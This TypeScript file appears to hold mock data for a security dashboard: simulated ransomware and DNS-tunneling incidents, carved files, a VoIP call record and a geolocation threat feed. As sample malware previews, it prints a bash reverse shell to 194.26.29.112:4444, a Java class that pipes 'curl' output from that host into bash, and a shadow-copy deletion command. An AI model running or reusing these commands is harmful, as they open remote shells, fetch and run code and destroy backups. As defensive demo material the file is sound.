  {
    id: 'EV-WAZUH-S2-03',
    timestamp: '2026-10-13T07:16:04Z',
    sourceTool: 'WAZUH',
    category: 'ENDPOINT_PROCESS',
    hostname: 'DC01-Primary.ad.corp',
    destIp: '10.0.1.5',
    severity: 'CRITICAL',
    title: 'Wazuh EDR: Volume Shadow Copy Deletion (vssadmin.exe)',
    description: 'Wazuh Rule 92102: vssadmin.exe delete shadows /all /quiet was invoked. High confidence precursor to ransomware encryption.',
    rawEvent: '{"rule":{"id":92102,"level":14,"description":"Volume Shadow Copy deletion detected"},"data":{"process":"vssadmin.exe","cmdline":"vssadmin.exe delete shadows /all /quiet"}}',
    evidenceHash: syncPseudoSha256('wazuh_vssadmin_delete_shadows'),
    mitreTechniques: ['T1490'],
    attributes: { cmdline: 'vssadmin.exe delete shadows /all /quiet' }
  }
];

export const MOCK_INCIDENT_S2: Incident = {
  id: 'INC-2026-7712',
  title: 'Ransomware Pre-Encryption Lateral Pivot & Shadow Copy Deletion',
  summary: 'Ransomware deployment stage detected. Attacker used an HR workstation to pivot across SMB/RPC to Domain Controller DC01-Primary, followed by immediate execution of vssadmin shadow copy deletion.',
  severity: 'CRITICAL',
  confidenceScore: 95,
  confidenceBreakdown: {
    networkDiscoveryCorroboration: 20,
    idsPayloadDetection: 30,
    packetForensicsVerification: 15,
    endpointExecutionConfirmation: 25,
    threatIntelReputationMatch: 5
  },
  status: 'CONTAINMENT_IN_PROGRESS',
  affectedAssets: [MOCK_ASSETS[1], MOCK_ASSETS[3]],
  attackerIps: ['192.168.10.42 (Internal Pivot)'],
  primaryAttackVector: 'SMB / RPC PsExec Lateral Movement (T1021.002)',
  firstObservedAt: '2026-10-13T06:10:00Z',
  lastObservedAt: '2026-10-13T07:16:04Z',
  events: MOCK_EVENTS_S2,
  mitreMatrix: [
    { tactic: 'Lateral Movement', id: 'T1021.002', name: 'SMB/Windows Admin Shares', eventIds: ['EV-SURI-S2-02'], confidence: 95 },
    { tactic: 'Impact', id: 'T1490', name: 'Inhibit System Recovery (vssadmin)', eventIds: ['EV-WAZUH-S2-03'], confidence: 99 }
  ],
  hypotheses: [
    {
      id: 'HYP-S2-A',
      title: 'Hypothesis A: Active LockBit 3.0 / BlackCat Ransomware Deployment',
      likelihood: 'HIGH',
      confidencePercentage: 95,
      rationale: 'vssadmin shadow deletion coupled with automated SMB PsExec lateral spread is signature ransomware execution.',
      supportingEvidenceIds: ['EV-SURI-S2-02', 'EV-WAZUH-S2-03'],
      refutingEvidenceIds: []
    }
  ],
  recommendations: [
    {
      id: 'REC-S2-01',
      title: 'Emergency Host Quarantine: Workstation-HR03 and DC01 RPC Filter',
      priority: 'IMMEDIATE',
      reason: 'Prevent ransomware payload encryption binaries from executing across network shares.',
      requiredTool: 'WAZUH',
      suggestedCommand: '/var/ossec/bin/agent_control -b 192.168.10.42'
    }
  ]
};

// --- Scenario 3: DNS Tunneling Exfiltration ---
export const MOCK_EVENTS_S3: NormalizedEvent[] = [
  {
    id: 'EV-ZEEK-S3-01',
    timestamp: '2026-10-13T05:20:10Z',
    sourceTool: 'ZEEK',
    category: 'DNS',
    sourceIp: '10.0.4.15',
    destIp: '8.8.8.8',
    protocol: 'UDP',
    severity: 'HIGH',
    title: 'Zeek DNS Anomaly: High Shannon Entropy (>4.8) on Subdomain Queries',
    description: 'Zeek protocol behavioral analyzer flagged 4,200 unique encoded subdomains resolving to ns1.data-exfil-sink.org within 10 minutes.',
    rawEvent: '{"ts":1791885610,"uid":"Cdns991","id.orig_h":"10.0.4.15","query":"a8f9c1048b.ns1.data-exfil-sink.org","qtype_name":"TXT","entropy":4.89}',
    evidenceHash: syncPseudoSha256('zeek_dns_entropy_tunneling'),
    mitreTechniques: ['T1071.004', 'T1041'],
    attributes: { qtype: 'TXT', entropy: 4.89, totalQueries: 4200 }
  },
  {
    id: 'EV-SURI-S3-02',
    timestamp: '2026-10-13T05:22:00Z',
    sourceTool: 'SURICATA',
    category: 'NETWORK_ALERT',
    sourceIp: '10.0.4.15',
    destIp: '8.8.8.8',
    destPort: 53,
    protocol: 'UDP',
    severity: 'CRITICAL',
    title: 'Suricata Alert: ET MALWARE DNS Tunneling Utility (Iodine / dnscat2 protocol)',
    description: 'Suricata detected continuous large TXT record responses carrying base64 compressed data payloads.',
    rawEvent: '{"alert":{"signature":"ET MALWARE DNS Tunneling Data Exfiltration Outbound","signature_id":2027110,"severity":1}}',
    evidenceHash: syncPseudoSha256('suricata_dns_tunnel_iodine'),
    mitreTechniques: ['T1071.004', 'T1048'],
    attributes: { toolSignature: 'dnscat2' }
  }
];

export const MOCK_INCIDENT_S3: Incident = {
  id: 'INC-2026-4419',
  title: 'Covert Data Exfiltration via High-Entropy DNS Tunneling',
  summary: 'Persistent unauthorized data exfiltration detected originating from Corp-DB01. Zeek identified abnormal TXT record entropy followed by Suricata signature confirmation of dnscat2 protocol.',
  severity: 'HIGH',
  confidenceScore: 92,
  confidenceBreakdown: {
    networkDiscoveryCorroboration: 10,
    idsPayloadDetection: 35,
    packetForensicsVerification: 25,
    endpointExecutionConfirmation: 12,
    threatIntelReputationMatch: 10
  },
  status: 'OPEN_INVESTIGATION',
  affectedAssets: [MOCK_ASSETS[0]],
  attackerIps: ['ns1.data-exfil-sink.org (DNS Nameserver)'],
  primaryAttackVector: 'DNS Protocol Abuse / Tunneling (T1071.004)',
  firstObservedAt: '2026-10-13T05:20:10Z',
  lastObservedAt: '2026-10-13T05:22:00Z',
  events: MOCK_EVENTS_S3,
  mitreMatrix: [
    { tactic: 'Exfiltration', id: 'T1041', name: 'Exfiltration Over C2 Channel', eventIds: ['EV-ZEEK-S3-01'], confidence: 92 },
    { tactic: 'Command and Control', id: 'T1071.004', name: 'DNS Tunneling', eventIds: ['EV-SURI-S3-02'], confidence: 96 }
  ],
  hypotheses: [
    {
      id: 'HYP-S3-A',
      title: 'Hypothesis A: Active Intellectual Property Exfiltration via DNS',
      likelihood: 'HIGH',
      confidencePercentage: 92,
      rationale: 'Over 4,200 high-entropy TXT records indicate chunked binary exfiltration passing through recursive DNS.',
      supportingEvidenceIds: ['EV-ZEEK-S3-01', 'EV-SURI-S3-02'],
      refutingEvidenceIds: []
    }
  ],
  recommendations: [
    {
      id: 'REC-S3-01',
      title: 'Sinkhole Domain data-exfil-sink.org at Internal Resolvers',
      priority: 'IMMEDIATE',
      reason: 'Halt data transfer immediately and capture resolving client IPs.',
      requiredTool: 'SURICATA',
      suggestedCommand: 'rndc zone-redirect data-exfil-sink.org 127.0.0.1'
    }
  ]
};

export function getScenarioData(scenarioId: string): Incident {
  if (scenarioId === 'scenario_2') return MOCK_INCIDENT_S2;
  if (scenarioId === 'scenario_3') return MOCK_INCIDENT_S3;
  return MOCK_INCIDENT_S1;
}

// --- Carved Files Extracted from PCAP / Wireshark Object Export ---
export const MOCK_CARVED_FILES: import('../types/security').CarvedFileObject[] = [
  {
    id: 'CARVED-001',
    fileName: 'target_security_badge.png',
    fileType: 'IMAGE',
    mimeType: 'image/png',
    sizeBytes: 42180,
    extractedFromFrame: 1425,
    sourceProtocol: 'HTTP',
    sourceHost: '194.26.29.112:80',
    destinationHost: '10.0.4.15:52190',
    md5: '7d4bf03a98e21a4f00129bc37f098321',
    sha256: '9f83a8b23c914e6d782103fbc19082da20491823719283748291038472910293',
    threatVerdict: 'SUSPICIOUS',
    virusTotalScore: '14/72 Detections (Steganography Carrier)',
    previewContent: 'PNG Image header detected [Width: 480px, Height: 320px, BitDepth: 8, ColorType: RGBA]. LSB Analysis indicates concealed encrypted payload in blue channel.',
    previewUrl: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="360" height="220" viewBox="0 0 360 220"><rect width="360" height="220" rx="16" fill="%230f172a"/><rect x="20" y="20" width="320" height="180" rx="10" fill="%231e293b" stroke="%2338bdf8" stroke-width="2"/><circle cx="80" cy="90" r="35" fill="%2338bdf8" opacity="0.8"/><rect x="50" y="140" width="60" height="30" rx="4" fill="%230ea5e9"/><text x="140" y="75" fill="%23ffffff" font-family="sans-serif" font-weight="bold" font-size="16">CORP ACCESS BADGE</text><text x="140" y="100" fill="%2394a3b8" font-family="sans-serif" font-size="12">ID: SEC-8941-CORE</text><text x="140" y="125" fill="%23f43f5e" font-family="monospace" font-size="11">TIER 1 ACCESS CLEARED</text><rect x="140" y="145" width="160" height="18" rx="4" fill="%23334155"/><text x="148" y="158" fill="%2338bdf8" font-family="monospace" font-size="10">STEGO-PAYLOAD: HIDDEN</text></svg>',
    hexDumpPreview: '89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 01 E0 00 00 01 40 08 06 00 00 00 6C 3D 1A ... [LSB: 0x41 0x50 0x54 0x2D 0x32 0x39]',
    entropy: 7.82,
    extractedAt: '2026-10-13T08:14:03.110Z'
  },
  {
    id: 'CARVED-002',
    fileName: 'payload.sh',
    fileType: 'SCRIPT',
    mimeType: 'text/x-shellscript',
    sizeBytes: 842,
    extractedFromFrame: 1428,
    sourceProtocol: 'HTTP',
    sourceHost: '194.26.29.112:80',
    destinationHost: '10.0.4.15:52190',
    md5: 'e2fc714c4727ee9395f324cd2e7f331f',
    sha256: 'a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0',
    threatVerdict: 'MALICIOUS',
    virusTotalScore: '58/72 Detections (Linux.Downloader.C2)',
    previewContent: `#!/bin/bash
# Extracted from TCP stream 42 via Wireshark Export Objects
echo "[*] Establishing persistent C2 channel..."
export C2_HOST="194.26.29.112"
export C2_PORT="4444"

# Check root privilege
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] Root privileges confirmed"
fi

# Spawn interactive reverse shell
/bin/bash -i >& /dev/tcp/$C2_HOST/$C2_PORT 0>&1 &
echo "[+] Reverse shell dispatched to background (PID $!)"`,
    hexDumpPreview: '23 21 2F 62 69 6E 2F 62 61 73 68 0A 23 20 45 78 74 72 61 63 74 65 64 20 66 72 6F 6D 20 54 43 50 ...',
    entropy: 4.88,
    extractedAt: '2026-10-13T08:14:03.950Z'
  },
  {
    id: 'CARVED-003',
    fileName: 'Exploit.class',
    fileType: 'EXECUTABLE',
    mimeType: 'application/java-vm',
    sizeBytes: 14280,
    extractedFromFrame: 1428,
    sourceProtocol: 'HTTP',
    sourceHost: '194.26.29.112:80',
    destinationHost: '10.0.4.15:52190',
    md5: 'ca89104b204e9f781109a23b1029cdee',
    sha256: '4481029384729102938471928374615243526172839405918273645192837465',
    threatVerdict: 'MALICIOUS',
    virusTotalScore: '63/72 Detections (Exploit.Java.JNDI.Gen)',
    previewContent: `// Decompiled Java Bytecode from Exploit.class
package exploit;
import java.io.InputStream;
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "curl -s http://194.26.29.112/payload.sh | bash"});
        } catch (Exception e) {}
    }
}`,
    hexDumpPreview: 'CA FE BA BE 00 00 00 37 00 24 07 00 02 01 00 0F 65 78 70 6C 6F 69 74 2F 45 78 70 6C 6F 69 74 ...',
    entropy: 6.94,
    extractedAt: '2026-10-13T08:14:03.200Z'
  },
  {
    id: 'CARVED-004',
    fileName: 'exfiltrated_corp_patents_q3.pdf',
    fileType: 'DOCUMENT',
    mimeType: 'application/pdf',
    sizeBytes: 218400,
    extractedFromFrame: 1442,
    sourceProtocol: 'DNS',
    sourceHost: '10.0.4.15',
    destinationHost: 'ns1.data-exfil-sink.org',
    md5: '3f89a10bcdef0123456789abcdef0123',
    sha256: '7102938475610293847561029384756102938475610293847561029384756102',
    threatVerdict: 'CONFIDENTIAL_EXFIL',
    virusTotalScore: 'Clean Document (Contains Confidential IP)',
    previewContent: `%PDF-1.7
1 0 obj << /Title (CONFIDENTIAL INTELLECTUAL PROPERTY - Q3 DEEP TECH PATENTS) /Author (Corp R&D) >>
CLASSIFIED RESEARCH & DEVELOPMENT REPORT
Proprietary Quantum Cryptography Algorithm Schema & Key Distribution Specifications.
Status: RESTRICTED DISTRIBUTION.`,
    hexDumpPreview: '25 50 44 46 2D 31 2E 37 0A 25 E2 E3 CF D3 0A 31 20 30 20 6F 62 6A 20 3C 3C 20 2F 54 69 74 6C 65 ...',
    entropy: 7.15,
    extractedAt: '2026-10-13T08:14:06.000Z'
  }
];

// --- VoIP Call & RTP Audio Streams Analyzed by Wireshark ---
export const MOCK_VOIP_CALLS: import('../types/security').VoipCallSession[] = [
  {
    callId: 'SIP-CALL-2026-89410-EXT',
    fromCaller: 'sip:external_spoof@194.26.29.112',
    toCallee: 'sip:cfo_desk_direct@corp-pbx.internal (Ext: 1042)',
    codec: 'G.711 u-law (PCMU) @ 8000 Hz, 64 kbps',
    startTime: '2026-10-13T08:11:40Z',
    durationSeconds: 48,
    sipMessages: [
      { method: 'INVITE', timestamp: '08:11:40.100Z', from: 'sip:external_spoof', to: 'sip:cfo_desk_direct', frameNumber: 1380 },
      { method: '100 TRYING', timestamp: '08:11:40.125Z', from: 'sip:cfo_desk_direct', to: 'sip:external_spoof', frameNumber: 1381, statusCode: 100 },
      { method: '180 RINGING', timestamp: '08:11:40.210Z', from: 'sip:cfo_desk_direct', to: 'sip:external_spoof', frameNumber: 1382, statusCode: 180 },
      { method: '200 OK', timestamp: '08:11:42.500Z', from: 'sip:cfo_desk_direct', to: 'sip:external_spoof', frameNumber: 1385, statusCode: 200 },
      { method: 'ACK', timestamp: '08:11:42.520Z', from: 'sip:external_spoof', to: 'sip:cfo_desk_direct', frameNumber: 1386 },
      { method: 'BYE', timestamp: '08:12:30.500Z', from: 'sip:external_spoof', to: 'sip:cfo_desk_direct', frameNumber: 1419 }
    ],
    rtpStream: {
      ssrc: '0x4B91A201',
      totalPackets: 2400,
      lostPackets: 6,
      packetLossPct: 0.25,
      avgJitterMs: 2.8,
      maxJitterMs: 5.4,
      mosScore: 4.38,
      audioQualityRating: 'EXCELLENT',
      synthesizedAudioFrequencies: [440, 554, 659, 880, 554, 440, 330, 440]
    },
    threatIndicators: [
      'Caller-ID Spoofing detected: From domain does not match SIP Contact IP header',
      'Vishing / Social Engineering precursor to port 8443 reconnaissance',
      'Audio stream intercepted before PBX firewall drop'
    ]
  }
];

// --- Live Geolocation Threat Feed (Fortinet & Sophos Style) ---
export const MOCK_GEO_THREATS: import('../types/security').GeoThreatFeed[] = [
  {
    id: 'GEO-001',
    timestamp: '2026-10-13T08:34:10Z',
    attackerIp: '194.26.29.112',
    country: 'Netherlands',
    countryCode: 'NL',
    city: 'Amsterdam',
    asn: 'AS4932 (Bulletproof Hosting Provider)',
    threatType: 'Log4j / JNDI RCE',
    severity: 'CRITICAL',
    targetAsset: 'Corp-DB01.fin.corp (10.0.4.15)',
    targetPort: 8443,
    actionTaken: 'ISOLATED_BY_EDR',
    throughputKbps: 4820
  },
  {
    id: 'GEO-002',
    timestamp: '2026-10-13T08:33:45Z',
    attackerIp: '45.154.255.88',
    country: 'Russia',
    countryCode: 'RU',
    city: 'Moscow',
    asn: 'AS208605 (Selectel Infrastructure)',
    threatType: 'Cobalt Strike C2',
    severity: 'CRITICAL',
    targetAsset: 'DMZ-ReverseProxy (172.16.0.5)',
    targetPort: 4444,
    actionTaken: 'BLOCKED_AT_EDGE',
    throughputKbps: 1240
  },
  {
    id: 'GEO-003',
    timestamp: '2026-10-13T08:32:10Z',
    attackerIp: '185.220.101.4',
    country: 'Germany',
    countryCode: 'DE',
    city: 'Frankfurt',
    asn: 'AS60729 (Tor Exit Relay Node)',
    threatType: 'Brute Force SSH',
    severity: 'HIGH',
    targetAsset: 'DC01-Primary (10.0.1.5)',
    targetPort: 22,
    actionTaken: 'DROPPED_BY_IPS',
    throughputKbps: 340
  },
  {
    id: 'GEO-004',
    timestamp: '2026-10-13T08:31:05Z',
    attackerIp: '103.152.220.19',
    country: 'China',
    countryCode: 'CN',
    city: 'Hangzhou',
    asn: 'AS37963 (Alibaba Cloud Computing)',
    threatType: 'DDoS SYN Flood',
    severity: 'HIGH',
    targetAsset: 'DMZ-ReverseProxy (172.16.0.5)',
    targetPort: 443,
    actionTaken: 'BLOCKED_AT_EDGE',
    throughputKbps: 18200
  },
  {
    id: 'GEO-005',
    timestamp: '2026-10-13T08:30:12Z',
    attackerIp: '178.239.166.72',
    country: 'Ukraine',
    countryCode: 'UA',
    city: 'Kyiv',
    asn: 'AS51852 (ITL LLC)',
    threatType: 'LockBit Ransomware',
    severity: 'CRITICAL',
    targetAsset: 'Workstation-HR03 (192.168.10.42)',
    targetPort: 445,
    actionTaken: 'FLAGGED_FOR_AUDIT',
    throughputKbps: 980
  }
];
